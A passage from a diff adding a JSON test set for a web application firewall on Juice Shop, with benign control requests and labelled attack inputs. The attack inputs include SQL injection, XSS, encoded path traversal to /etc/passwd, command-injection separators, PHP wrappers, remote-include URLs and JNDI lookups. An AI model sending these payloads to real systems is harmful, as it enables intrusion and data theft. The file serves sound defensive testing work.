+    "description": "Word 'xml' in a search",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-059",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "example.org stickers"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Domain-like token in a search",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-060",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/api/Feedbacks/",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"comment\":\"Found you via https://example.org/juice-shop - great project\",\"rating\":5}",
+    "description": "Feedback containing an ordinary https URL (SSRF/RFI false-positive control)",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-061",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/api/Feedbacks/",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"comment\":\"The legal notice under /ftp/legal.md was helpful\",\"rating\":4}",
+    "description": "Feedback mentioning a site path (traversal/LFI false-positive control)",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-062",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/ftp/",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Public FTP directory listing",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-063",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/ftp/acquisitions.md",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Public document download",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-064",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/api/Products/3",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Product detail by id",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-065",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/captcha/",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Captcha used by the feedback form",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-066",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/",
+    "params": {},
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
+      "Accept-Encoding": "gzip, deflate"
+    },
+    "body": null,
+    "description": "Browser-like header set on the home page",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-067",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "100 ml"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Number and unit",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "SQLI-011",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "admin'--"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Comment marker in SQL-like input",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-012",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "1 UNION SELECT NULL"
+    },
+    "headers": {},
+    "body": null,
+    "description": "UNION SELECT with a single NULL column",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-013",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "1 AND 1=1"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Numeric boolean condition (AND 1=1)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-014",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test; SELECT version()"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Stacked-query syntax marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-015",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "name LIKE '%test%' AND 'a'='a"
+    },
+    "headers": {},
+    "body": null,
+    "description": "SQL operator and wildcard pattern",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-016",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "%27%20OR%201%3D1--"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Pre-encoded tautology: double URL-encoded on the wire (evasion test)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-017",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "1/**/UNION/**/SELECT/**/NULL"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Inline comments as whitespace between SQL keywords",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-018",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "' oR '1'='1' /*"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Mixed-case operator with C-style comment",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-019",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "'||'1'='1"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Alternative concatenation operator syntax (||)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "XSS-011",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<script>alert(1)</script>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Script element in the search API parameter",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-012",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "\"><script>alert(1)</script>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Attribute-context breakout pattern",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-013",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/api/Feedbacks/",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"comment\":\"<script>alert(1)</script>\",\"rating\":1}",
+    "description": "Stored-XSS-shaped feedback content",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "XSS-014",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
+    },
+    "headers": {},
+    "body": null,
+    "description": "HTML-entity encoded script element",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-015",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<ScRiPt>alert(1)</ScRiPt>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Mixed-case script element",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-016",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<svg%20onload%3Dalert(1)> "
+    },
+    "headers": {},
+    "body": null,
+    "description": "Partially pre-encoded SVG event handler (double-encoded on the wire)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-017",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<details open ontoggle=alert(1)>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Less common event handler (ontoggle)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-018",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "\" onmouseover=\"alert(1)"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Attribute-context injection without any tag",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "TRAV-009",
+    "category": "path-traversal",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/ftp/%2e%2e%252fetc%252fhostname",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Mixed single/double encoding of dot segments",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "TRAV-010",
+    "category": "path-traversal",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/ftp/%2e%2e%2f..%2fREADME.md",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Mixed encoded and literal dot segments",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "TRAV-011",
+    "category": "path-traversal",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/ftp/..%c0%af..%c0%afetc%c0%afpasswd",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Overlong UTF-8 slash encoding",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "TRAV-012",
+    "category": "path-traversal",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/assets/public/images/%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Windows-specific target with encoded backslashes",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "CMDI-001",
+    "category": "cmdi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test; echo WAF_TEST"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Semicolon and harmless echo token",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "CMDI-002",
+    "category": "cmdi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test && echo WAF_TEST"
+    },
+    "headers": {},
+    "body": null,
+    "description": "AND-chain command syntax marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "CMDI-003",
+    "category": "cmdi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test | echo WAF_TEST"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Pipe command syntax marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "CMDI-004",
+    "category": "cmdi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "$(echo WAF_TEST)"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Command substitution syntax marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "CMDI-005",
+    "category": "cmdi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "`echo WAF_TEST`"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Backtick substitution syntax marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "CMDI-006",
+    "category": "cmdi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test || echo WAF_TEST"
+    },
+    "headers": {},
+    "body": null,
+    "description": "OR-chain command syntax marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "CMDI-007",
+    "category": "cmdi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test; id"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Command separator and identity-command token, sent as input only",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "CMDI-008",
+    "category": "cmdi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test%0Aecho%20WAF_TEST"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Encoded newline separator marker (pre-encoded value, double URL-encoded on the wire)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "CMDI-009",
+    "category": "cmdi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test%3B%20echo%20WAF_TEST"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Encoded command separator (pre-encoded value, double URL-encoded on the wire)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "CMDI-010",
+    "category": "cmdi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test%26%26echo%20WAF_TEST"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Encoded AND-chain marker (pre-encoded value, double URL-encoded on the wire)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "LFI-001",
+    "category": "lfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "file:///etc/hostname"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Local-file URI marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "LFI-002",
+    "category": "lfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "/etc/passwd"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Unix sensitive-path marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "LFI-003",
+    "category": "lfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "C:\\Windows\\win.ini"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Windows configuration path marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "LFI-004",
+    "category": "lfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "....//....//etc/hostname"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Traversal-style local-file marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "LFI-005",
+    "category": "lfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "php://filter/convert.base64-encode/resource=index.php"
+    },
+    "headers": {},
+    "body": null,
+    "description": "PHP stream wrapper marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "LFI-006",
+    "category": "lfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "php://input"
+    },
+    "headers": {},
+    "body": null,
+    "description": "PHP input stream marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "LFI-007",
+    "category": "lfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "expect://id"
+    },
+    "headers": {},
+    "body": null,
+    "description": "PHP expect wrapper marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "LFI-008",
+    "category": "lfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "file:%2f%2f%2fetc%2fhostname"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Encoded file URI marker (pre-encoded value, double URL-encoded on the wire)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "LFI-009",
+    "category": "lfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "..%2f..%2fetc%2fhostname"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Encoded local file traversal marker (pre-encoded value, double URL-encoded on the wire)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "LFI-010",
+    "category": "lfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "file%3A%2F%2F%2Fetc%2Fhostname"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Encoded file URI (pre-encoded value, double URL-encoded on the wire)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "RFI-001",
+    "category": "rfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "https://example.invalid/test.txt"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Reserved invalid-domain remote resource marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "RFI-002",
+    "category": "rfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "http://example.invalid/payload.txt"
+    },
+    "headers": {},
+    "body": null,
+    "description": "HTTP remote-resource marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "RFI-003",
+    "category": "rfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "//example.invalid/resource"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Protocol-relative remote resource marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "RFI-004",
+    "category": "rfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "https%3A%2F%2Fexample.invalid%2Ffile"
+    },
+    "headers": {},
+    "body": null,
+    "description": "URL-encoded remote resource (pre-encoded value, double URL-encoded on the wire)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "RFI-005",
+    "category": "rfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "data://text/plain;base64,V0FGX1RFU1Q="
+    },
+    "headers": {},
+    "body": null,
+    "description": "PHP data:// stream wrapper with base64 content",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "RFI-006",
+    "category": "rfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "ftp://example.invalid/file.txt"
+    },
+    "headers": {},
+    "body": null,
+    "description": "FTP URI marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "RFI-007",
+    "category": "rfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "http://example.invalid/include.txt?"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Remote URL ending in '?' to truncate an appended suffix",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "RFI-008",
+    "category": "rfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "\\\\example.invalid\\share\\file"
+    },
+    "headers": {},
+    "body": null,
+    "description": "UNC-style remote resource marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "RFI-009",
+    "category": "rfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "HtTp://example.invalid/payload.txt"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Mixed-case URL scheme",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "RFI-010",
+    "category": "rfi",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "http://192.0.2.10/include.txt"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Remote include from an IP literal (TEST-NET-1, non-routable)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PHP-001",
+    "category": "php-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<?php echo 'WAF_TEST'; ?>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "PHP opening-tag marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PHP-002",
+    "category": "php-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<?= 'WAF_TEST' ?>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Short PHP echo-tag marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PHP-003",
+    "category": "php-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<?php system('echo WAF_TEST'); ?>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "PHP system-function marker, input only",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PHP-004",
+    "category": "php-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "${phpinfo()}"
+    },
+    "headers": {},
+    "body": null,
+    "description": "PHP-related function syntax marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PHP-005",
+    "category": "php-injection",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/products/search",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"q\":\"<?php echo 1; ?>\"}",
+    "description": "PHP-tag marker in JSON body",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PHP-006",
+    "category": "php-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "%3C%3Fphp%20echo%201%3B%20%3F%3E"
+    },
+    "headers": {},
+    "body": null,
+    "description": "URL-encoded PHP open tag (pre-encoded value, double URL-encoded on the wire)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PHP-007",
+    "category": "php-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "eval(base64_decode('ZWNobyAxOw=='))"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Obfuscated eval(base64_decode()) call without PHP tags",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PHP-008",
+    "category": "php-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<?= 1+1 ?>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "PHP short-tag expression marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PHP-009",
+    "category": "php-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "file_get_contents('/etc/hostname')"
+    },
+    "headers": {},
+    "body": null,
+    "description": "PHP file-read function call without tags",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PHP-010",
+    "category": "php-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<?php $x = 1; ?>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "PHP variable assignment marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "JAVA-001",
+    "category": "java-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "${jndi:ldap://127.0.0.1:1389/test}"
+    },
+    "headers": {},
+    "body": null,
+    "description": "JNDI marker using loopback address",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "JAVA-002",
+    "category": "java-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "${${lower:j}ndi:ldap://127.0.0.1:1389/test}"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Obfuscated JNDI marker to loopback",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "JAVA-003",
+    "category": "java-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2Ftest%7D"
+    },
+    "headers": {},
+    "body": null,
+    "description": "URL-encoded JNDI lookup (pre-encoded value, double URL-encoded on the wire)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "JAVA-004",
+    "category": "java-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "${java:version}"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Java expression marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "JAVA-005",
+    "category": "java-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "#{7*7}"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Expression-language marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "JAVA-006",
+    "category": "java-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "${7*7}"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Template expression marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "JAVA-007",
+    "category": "java-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "%24%7B7%2A7%7D"
+    },
+    "headers": {},
+    "body": null,
+    "description": "URL-encoded template expression (pre-encoded value, double URL-encoded on the wire)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "JAVA-008",
+    "category": "java-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "${env:PATH}"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Environment-variable expression marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "JAVA-009",
+    "category": "java-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "${jndi:rmi://127.0.0.1:1099/a}"
+    },
+    "headers": {},
+    "body": null,
+    "description": "JNDI lookup over RMI to loopback",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "JAVA-010",
+    "category": "java-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "${lower:WAF_TEST}"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Expression obfuscation marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "JAVA-011",
+    "category": "java-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "T(java.lang.System).getenv()"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Spring Expression Language (SpEL) type reference",
